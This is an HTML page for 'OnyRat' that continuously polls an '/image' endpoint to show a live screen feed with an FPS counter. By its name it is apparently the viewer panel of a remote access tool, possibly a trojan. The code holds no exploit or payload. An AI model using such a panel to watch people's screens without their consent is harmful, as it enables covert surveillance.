<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Screen Stream â€” OnyRat</title>
    <style>
      :root{
        --bg:#07000a;
        --panel:#140017;
        --accent1:#ff00ff;
        --accent2:#f0f;
        --danger:#ff0033;
        --mono: 'Courier New', monospace;
      }

      html,body{height:100%;margin:0;font-family:var(--mono);background:radial-gradient(ellipse at center,#050007 0%,var(--bg) 60%);color:var(--accent2);-webkit-font-smoothing:antialiased}

      @keyframes glow{
        0%{text-shadow:0 0 6px var(--accent2),0 0 12px var(--accent2),0 0 18px var(--accent1)}
        50%{text-shadow:0 0 10px var(--accent2),0 0 20px var(--accent2),0 0 36px var(--accent1)}
        100%{text-shadow:0 0 6px var(--accent2),0 0 12px var(--accent2),0 0 18px var(--accent1)}
      }

      @keyframes fadeInUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}

      .stage{min-height:100vh;display:grid;place-items:center;padding:28px}

      .panel{
        width:100%;max-width:1300px;background:linear-gradient(180deg,rgba(255,0,255,0.02),rgba(0,0,0,0.25));border:1px solid rgba(255,0,255,0.32);box-shadow:0 10px 60px rgba(255,0,255,0.12);padding:28px;border-radius:12px;backdrop-filter:blur(6px);
        animation:fadeInUp .9s ease both;
        display:flex;flex-direction:column;gap:18px;align-items:center
      }

      .ony-banner{font-size:56px;letter-spacing:6px;margin:0;line-height:0.9;color:var(--accent2);animation:glow 2s infinite alternate;-webkit-box-reflect:below 2px linear-gradient(transparent,transparent,rgba(255,0,255,0.06))}

      .screen-wrap{width:100%;background:linear-gradient(180deg,rgba(255,0,255,0.03),rgba(0,0,0,0.35));border-radius:8px;padding:14px;display:flex;justify-content:center;align-items:center;border:1px solid rgba(255,0,255,0.24);box-shadow:0 8px 40px rgba(0,0,0,1),inset 0 1px 0 rgba(255,255,255,0.08)}

      img#screen{max-width:calc(100vw - 120px);max-height:80vh;object-fit:contain;border-radius:6px;display:block;animation:fadeInUp .6s ease both}

      .meta{font-size:13px;opacity:.8;color:rgba(240,0,255,0.9);width:100%;display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
      .meta .left{display:flex;gap:8px;align-items:center}

      .footer-note{font-size:12px;color:rgba(255,255,255,0.6);opacity:.85}

      @media (max-width:720px){.ony-banner{font-size:36px}.panel{padding:16px}.screen-wrap{padding:10px}img#screen{max-height:60vh}}
    </style>
  </head>
  <body>
    <div class="stage">
      <div class="panel">
        <h1 class="ony-banner">ONYRAT</h1>

        <div class="screen-wrap">
          <img id="screen" src="/image" alt="live" />
        </div>

        <div class="meta">
          <div class="left">
            <span id="fps">FPS: 0</span>
          </div>
        </div>
      </div>
    </div>

    <script>
      const img = document.getElementById('screen');
      const fpsEl = document.getElementById('fps');

      let frames = 0;
      let last = performance.now();

      function tick(now) {
        frames++;
        if (now - last >= 1000) {
          fpsEl.textContent = `FPS: ${frames}`;
          frames = 0;
          last = now;
        }

        img.src = '/image?ts=' + now;
        requestAnimationFrame(tick);
      }

      img.addEventListener('error', () => {
        img.src = '/image?ts=' + Date.now();
      });

      requestAnimationFrame(tick);
    </script>
  </body>
</html>
